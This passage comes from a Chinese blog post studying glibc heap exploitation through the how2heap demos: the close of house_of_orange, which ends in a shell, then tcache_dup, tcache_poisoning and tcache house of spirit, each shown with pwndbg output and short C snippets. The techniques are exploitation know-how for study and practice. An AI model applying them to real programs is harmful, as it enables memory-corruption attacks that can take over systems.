0x0000000000000000	0x0000000000602460</span><br><span class="line">0x6024e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>用 <code>_IO_FILE_plus *</code> 读取 old top chunk：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus *) 0x602400)</span><br><span class="line">$7 &#x3D; &#123;</span><br><span class="line">  file &#x3D; &#123;</span><br><span class="line">    _flags &#x3D; 1852400175, </span><br><span class="line">    _IO_read_ptr &#x3D; 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020@b&quot;, </span><br><span class="line">    _IO_read_base &#x3D; 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base &#x3D; 0x2 &lt;error: Cannot access memory at address 0x2&gt;, </span><br><span class="line">    _IO_write_ptr &#x3D; 0x3 &lt;error: Cannot access memory at address 0x3&gt;, </span><br><span class="line">    _IO_write_end &#x3D; 0x0, </span><br><span class="line">    _IO_buf_base &#x3D; 0x0, </span><br><span class="line">    _IO_buf_end &#x3D; 0x0, </span><br><span class="line">    _IO_save_base &#x3D; 0x0, </span><br><span class="line">    _IO_backup_base &#x3D; 0x0, </span><br><span class="line">    _IO_save_end &#x3D; 0x0, </span><br><span class="line">    _markers &#x3D; 0x0, </span><br><span class="line">    _chain &#x3D; 0x0, </span><br><span class="line">    _fileno &#x3D; 0, </span><br><span class="line">    _flags2 &#x3D; 0, </span><br><span class="line">    _old_offset &#x3D; 4196239, </span><br><span class="line">    _cur_column &#x3D; 0, </span><br><span class="line">    _vtable_offset &#x3D; 0 &#39;\000&#39;, </span><br><span class="line">    _shortbuf &#x3D; &quot;&quot;, </span><br><span class="line">    _lock &#x3D; 0x0, </span><br><span class="line">    _offset &#x3D; 0, </span><br><span class="line">    _codecvt &#x3D; 0x0, </span><br><span class="line">    _wide_data &#x3D; 0x0, </span><br><span class="line">    _freeres_list &#x3D; 0x0, </span><br><span class="line">    _freeres_buf &#x3D; 0x0, </span><br><span class="line">    __pad5 &#x3D; 0, </span><br><span class="line">    _mode &#x3D; 0, </span><br><span class="line">    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable &#x3D; 0x602460</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line"> <span class="comment">// 最后随便申请一个内存以触发整个调用链，这也会获得shell。</span></span><br><span class="line"> <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">  But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>报错信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">*** Error in &#96;&#x2F;mnt&#x2F;hgfs&#x2F;VMShare&#x2F;how2heap&#x2F;glibc_2.25&#x2F;house_of_orange&#39;: malloc(): memory corruption: 0x00007ffff7dd2520 ***</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Backtrace: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x777e5)[0x7ffff7a847e5]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x8213e)[0x7ffff7a8f13e]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_malloc+0x54)[0x7ffff7a91184]</span><br><span class="line">&#x2F;mnt&#x2F;hgfs&#x2F;VMShare&#x2F;how2heap&#x2F;glibc_2.25&#x2F;house_of_orange[0x400788]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]</span><br><span class="line">&#x2F;mnt&#x2F;hgfs&#x2F;VMShare&#x2F;how2heap&#x2F;glibc_2.25&#x2F;house_of_orange[0x400589]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Memory map: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">00400000-00401000 r-xp 00000000 00:31 767                                &#x2F;mnt&#x2F;hgfs&#x2F;VMShare&#x2F;how2heap&#x2F;glibc_2.25&#x2F;house_of_orange</span><br><span class="line">00600000-00601000 r--p 00000000 00:31 767                                &#x2F;mnt&#x2F;hgfs&#x2F;VMShare&#x2F;how2heap&#x2F;glibc_2.25&#x2F;house_of_orange</span><br><span class="line">00601000-00602000 rw-p 00001000 00:31 767                                &#x2F;mnt&#x2F;hgfs&#x2F;VMShare&#x2F;how2heap&#x2F;glibc_2.25&#x2F;house_of_orange</span><br><span class="line">00602000-00645000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">[New process 9273]</span><br><span class="line">process 9273 is executing new program: &#x2F;bin&#x2F;dash</span><br><span class="line">Error in re-setting breakpoint 1: No source file named glibc_2.25&#x2F;house_of_orange.c.</span><br><span class="line">[New process 9274]</span><br><span class="line">process 9274 is executing new program: &#x2F;bin&#x2F;dash</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>
<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><p>Tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist.</p>
<h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><p>tcache 的利用方法和介绍可以参考这里：</p>
<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html">4.14 glibc tcache 机制</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">Tcache Attack</a></p>
<p>这里是一个简单的例子，用了 tcache 之后连 double free 都变得方便了 XD</p>
<p>首先申请一个 tcache a，然后连续 free 两次。此时 free list 中包含两个被 free 的 a 的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x20 [  2]: 0x8402260 ◂— 0x8402260                                                                    fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty </span><br></pre></td></tr></table></figure>
<p>正是输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Now the free list has [ 0x8402260, 0x8402260 ].</span><br></pre></td></tr></table></figure>
<p>接下来如果申请两次 tcache 大小的内存的话会被分配到相同的地址。</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist.<br>通过滥用 tcache freelist 欺骗 malloc 返回完全任意的指针。</p>
<h3 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h3><p>这个文件通过欺骗 malloc 返回任意地址的指针（本例中为堆栈）来演示一个简单的 tcache_poisoning 攻击。这个攻击和 fastbin corruption 攻击类似。</p>
<p>首先得到我们希望 malloc 返回的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x &amp;stack_var</span><br><span class="line">$2 &#x3D; 0x7ffffffedd98</span><br></pre></td></tr></table></figure>
<p>然后 <code>malloc(128)</code> 并释放掉。</p>
<p>此时的 bins：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x8402260 ?— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>接下来覆盖被释放的指针 a 的前 8 个字节（fd-&gt;next 指针）指向我们要控制的位置（stack_var）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx a</span><br><span class="line">0x8402260:      0x00007ffffffedd98      0x0000000000000000</span><br><span class="line">0x8402270:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x8402280:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x8402290:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x84022a0:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>此时的 tcachebins：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x8402260 —? 0x7ffffffedd98 —? 0x8000650 (_start) ?— xor    ebp, ebp &#x2F;* 0x89485ed18949ed31 *&#x2F;</span><br></pre></td></tr></table></figure>
<p>接下来申请一次 <code>malloc(128)</code> ，tcachebins 变为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  0]: 0x7ffffffedd98 —? 0x8000650 (_start) ?— xor    ebp, ebp &#x2F;* 0x89485ed18949ed31 *&#x2F;</span><br></pre></td></tr></table></figure>
<p>发现我们第一次申请的那块内存被分配出去了。接下来在申请一次（<code>malloc(128)</code>）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2nd malloc(128): 0x7ffffffedd98</span><br></pre></td></tr></table></figure>
<p>此时会发现已经把我们想要的地址分配出来了。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>Frees a fake chunk to get malloc to return a nearly-arbitrary pointer.<br>释放掉一块 fake chunk，然后申请内存以返回几乎任意的指针。</p>
<h3 id="解释-3"><a href="#解释-3" class="headerlink" title="解释"></a>解释</h3><p>这个文件描述了 tcache 上的 house of spirit 攻击。</p>
<p>它和通常的 house of spirit 攻击类似，但你不必在将被释放的 fake chunk 后新建一个 fake chunk。</p>
<p>你可以在 <code>malloc.c</code> 中的函数 <code>_int_free</code> 中看到这一点：调用 <code>tcache_put</code> 却没有检查下一块的大小和 <code>prev_inuse</code> 位是否合理。</p>
<p>可以通过搜索字符串 <code>invalid next size</code> 和 <code>double free or corruption</code> 来找到相关的信息。</p>
<p>在这里，我们先 <code>malloc(1)</code> 以初始化内存空间。</p>
<p>首先假设我们可以溢出并覆盖一个指针以指向 fake chunk 的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure>
<p>上面即是我们假设的被覆盖的指针和 fake chunk。</p>
<p>这个区域包含一个 fake chunk，它的 size 值位于 <code>fake_chunk[1]</code>。</p>
<p>这个 chunk 的大小必须落入到 tcache 的类中（chunk.size &lt;= 0x410，在 x64 上 malloc arg &lt;= 0x408）。对于 tcache 块，<code>PREV_INUSE(lsb)</code> 位被 <code>free</code> 忽略，但是 <code>IS_MMAPPED(第二个 lsb)</code> 和 <code>NON_MAIN_ARENA(第三个 lsb)</code> 位会导致某些问题。</p>
<p>还要注意的一点是 malloc 的对齐，在 x64 中，0x30~0x38 都会被对齐到 0x40。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure>
<p>将 size 位设为 0x40。接下来用第一块 fake chunk 内的伪区域地址覆盖我们的指针 fake_chunk，且还需注意与此块关联的内存地址必须是 16 字节对齐的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;4gx fake_chunks</span><br><span class="line">0x7ffffffedd50: 0x0000000000000009      0x0000000000000040</span><br><span class="line">0x7ffffffedd60: 0x00007ffffffeddc8      0x0000000000f0b6ff</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x a</span><br><span class="line">$1 &#x3D; 0x7ffffffedd60</span><br></pre></td></tr></table></figure>
<p>接下来释放这个被覆盖的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure>
<p>此时的 tcachebins：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x7ffffffedd60 ?— 0x0</span><br></pre></td></tr></table></figure>
<p>之后的 malloc 会返回 <code>fake_chunks[1]</code> 的区域，也就是 <code>fake_chunks[2]</code> 的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x30): 0x7ffffffedd60</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>根据参考文章走了一遍 how2heap 的流程，收获还是蛮多的。之前一看堆题就头大，静下心来刷一遍 how2heap 之后发现如果只是利用的话并不麻烦。但是想要更深入了解原理的话还得多看源代码。接下来就是做做题巩固一下知识，继续深入理解源代码了。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">linux程序的常用保护机制</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86809">【技术分享】how2heap总结-下</a></p>
<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.9_heap_exploit_4.html">3.1.9 Linux 堆利用（四）</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86ptmalloc%e6%ba%90%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90.pdf">glibc内存管理ptmalloc源代码分析.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html">4.13 利用 _IO_FILE 结构</a></p>
<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html">4.14 glibc tcache 机制</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">Tcache Attack</a></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://www.qrzbing.cn/blog">qrzbing</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://www.qrzbing.cn/blog/2019/07/19/how2heap-5/">http://www.qrzbing.cn/blog/2019/07/19/how2heap-5/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/blog/tags/pwn/">pwn</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/blog/2019/07/22/googlectf2019-secureboot/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">Google CTF 2019 - Secure Boot 题解</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/blog/2019/07/10/how2heap-4/">
        <span class="next-text nav-default">how2heap-4</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:qrzbing#gmail.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/qrzbing" class="iconfont icon-github" title="github"></a>
        <a href="/blog/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">qrzbing</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/blog/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/blog/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/blog/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/blog/js/src/even.js?v=2.11.0"></script>
</body>
</html>
